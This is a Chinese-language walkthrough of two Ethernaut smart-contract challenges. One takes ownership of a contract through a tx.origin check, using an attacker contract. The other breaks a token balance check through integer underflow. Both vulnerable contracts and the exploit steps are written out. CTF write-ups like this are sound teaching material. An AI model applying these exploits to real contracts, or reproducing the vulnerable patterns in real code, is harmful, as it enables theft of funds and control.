### 第四题 Telephone
### 题目
获得下面合约来完成这一关
### 提示
- 参阅帮助页面,在 "Beyond the console" 部分
### 源码
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;
    //构造函数，在合约部署时执行。它将owner变量设置为合约部署者（即msg.sender）
    constructor() {
        owner = msg.sender;
    }

    //改变owner
    function changeOwner(address _owner) public {
        //只有当交易的发起者（tx.origin）与当前调用者（msg.sender）不同时，才会更改所有者。这种设计         //用于防止合约被直接调用时更改所有者，而只能通过另一个合约调用
        //msg.sender: 指直接调用智能合约功能的帐户或智能合约的地址
        //tx.origin: 指调用智能合约功能的账户地址，只有账户地址可以是tx.origin
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```


### 解题思路
当交易的发起者（tx.origin）与当前调用者（msg.sender）不同时，才会更改所有者.因此需要通过另一个合约调用该合约来更换owner
### 解题过程
1.获取实例后，取得合约地址  
2.部署新的合约  
```solidity
contract HackTelephone {
    Telephone hacktele;
    constructor(address aimAddr) {
        hacktele = Telephone(aimAddr);
    }
    function hack() public {
        //这时的合约调用者是合约HackTelephone的地址，而tx.origin是当前的账户地址
        hacktele.changeOwner(tx.origin);
    }
}
```
3.在remix编译后，部署Hacktelephone合约,填入实例的合约地址  
4.调用hack函数进行攻击  
5.检查下msg.sender和tx.origin  
### 第五题 Token
### 题目
这一关的目标是攻破下面这个基础 token 合约  
你最开始有20个 token, 如果你通过某种方法可以增加你手中的 token 数量,你就可以通过这一关,当然越越好  
### 提示
- 什么是 odometer?
### 源码
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {
    //一个映射，用于存储每个地址的代币余额
    mapping(address => uint256) balances;
    //总供应
    uint256 public totalSupply;

    //构造函数-合约初始金额=总供应=设置的初始值
    constructor(uint256 _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    //转账函数，
    function transfer(address _to, uint256 _value) public returns (bool) {
        //判断合约金额大于等于转账金额
        require(balances[msg.sender] - _value >= 0);
        //合约账户减去金额
        balances[msg.sender] -= _value;
        //接收地址加上转账金额
        balances[_to] += _value;
        return true;
    }

    //获得_owner的账户金额
    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
}
```
### 解题思路
关键在transfer函数，在"require"校验，可以通过“整数下溢”来绕过检查，同时这里的balances和value都是无符号整数，所以无论如何他们相减之后值依旧大于0（在相等的条件下为0）  
题目中token初始化为20，所以当转21的时候则会发生下溢，导致数值变大其数值为2^256 - 1  
### 解题过程
1.获取实例  
2.初始化头账户数量为20  
3.调用transfer函数向随便一个地址转21个币  
4.提交  
